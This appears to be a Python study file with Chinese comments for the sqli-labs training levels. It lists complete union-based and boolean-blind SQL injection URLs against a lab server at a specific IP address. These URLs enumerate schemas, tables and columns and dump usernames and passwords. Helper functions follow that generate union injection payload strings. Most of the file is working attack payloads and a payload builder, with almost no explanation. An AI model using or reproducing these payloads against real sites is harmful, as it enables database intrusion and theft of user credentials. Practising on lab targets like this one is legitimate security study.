'''

    %27 ' ' '
    %20 '   '

'''




'''

#union sqlinjection

    #查询有几列 id=a ,order by b
    http://47.95.4.158:8002/Less-1/?id=1' order by 3 --+

    #查询有几列回显 id=a ,order by 111 222 333 ... bbb
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,33 --+

    #查询库实例名 id=a , select 11 ... group_concat(schema_name) ... bbb 
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(schema_name) from information_schema.schemata --+

    #查询库的表名 id=a , select 11 ... group_concat(table_name) ... bbb , table_schema = 'c'
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(table_name) from information_schema.tables where table_schema = 'security' --+

    #查询表的列名 id=a , select 11 ... group_concat(column_name) ... bbb , table_schema = 'c' , table_name = 'd'
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users' --+

    #查询数据 id=a , select 11 ... group_concat(list) ... bbb , from c.d
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(id,0x20,username,0x20,password) from security.users --+

'''





'''

#bool sqlinjection

#查数据库实例名

    #查询数据库个数，id=a , < b 
    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(schema_name) from information_schema.schemata) < 6)--+

    #查询某个数据库长度,id=a ,limit c , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(schema_name) from information_schema.schemata limit 0,1) < 19)--+

    #查看某个数据库名, id=a , limit c , ),d,1) , < b 
    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))) < 106)--+

#查数据库表名

    #查询表个数,id=a, table_schema = 'e' ,< b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(distinct+table_name) from information_schema.tables where table_schema = 'security') < 6)--+

    #查询表名的长度，id=a, table_schema = 'e' , limit c, < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(table_name) from information_schema.tables where table_schema = 'security' limit 0,1) < 7)--+

    #查询表名,id=a, table_schema = 'e' , limit c, ),d,1) , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))) < 102)--+

#查表中列名

    #查询表中列个数,id=a, table_schema = 'e' , table_name = 'f' , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(distinct+column_name) from information_schema.columns where table_schema='security' and table_name='users' ) < 4)--+

    #查询表中列名长度，id=a, table_schema = 'e' , table_name = 'f' , limit c, < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1) < 3)--+

    #查询列名,id=a, table_schema = 'e' , table_name = 'f' , limit c, ),d,1) , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))) < 106)--+

#查数据

    #查询表中数据的行数,id=a, e.f , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(*) from security.users ) < 14)--+

    #查询表中数据的长度,id=a , length(g) , e.f , limit c, < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(id) from security.users limit 0,1) < 2)--+

    #查询表中数据,id=a , select g , e.f , limit c, ),d,1) , < b
    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select id from security.users limit 0,1),1,1))) < 50)--+

'''

def order_by(a):        #传入order by所需的列数
    a = str(a)
    return 'order by '+a+' --+'

def order_list(b):      #传入回显列数中的随机数
    list1 = [str(i) for i in b]
    list2 = ','.join(list1)
    return 'and 1=2 union select '+list2+' --+'

def union_sql(num1 = None,num2 = None,schema_name = None,table_name = None,column_name = []):
    if num1 == None or num2 == None:
        return "Error,please input num1 and num2."

    elif schema_name == None:
        list3 = []
        for i in range(num1):
            if i == num2-1:
                list3.append('group_concat(schema_name) from information_schema.schemata')
            else:
                list3.append(num1)
        list1 = [str(i) for i in list3]
        list2 = ','.join(list1)
        return 'and 1=2 union select '+list2+' --+'

    elif table_name == None:
        list3 = []
        for i in range(num1):
            if i == num2-1:
                list3.append('group_concat(table_name) from information_schema.tables where table_schema = \'' +schema_name+'\'')
            else:
                list3.append(num1)
        list1 = [str(i) for i in list3]
        list2 = ','.join(list1)
        return 'and 1=2 union select '+list2+' --+'
    
    elif len(column_name) == 0:
        list3 = []
        for i in range(num1):
            if i == num2-1:
                list3.append('group_concat(column_name) from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+table_name+'\'')
            else:
                list3.append(num1)
        list1 = [str(i) for i in list3]
        list2 = ','.join(list1)
        return 'and 1=2 union select '+list2+' --+' 

    else:
        list4 = [str(i) for i in column_name]
        list5 = ',0x20,'.join(list4)
        list3 = []
        for i in range(num1):
            if i == num2-1:
                list3.append('group_concat('+list5+') from '+schema_name+'.'+table_name)
            else:
                list3.append(num1)
        list1 = [str(i) for i in list3]
        list2 = ','.join(list1)
        return 'and 1=2 union select '+list2+' --+'             




if __name__ == "__main__":
    b = [1,'aaa',3,'bbb']
    print(order_by(3))
    print(order_list(b))
    print(union_sql(None,1,'database','table',b))
    print(union_sql(2,1,None,'table',b))
    print(union_sql(2,1,'database',None,b))
    print(union_sql(2,1,'database','table',[]))
    print(union_sql(2,1,'database','table',b))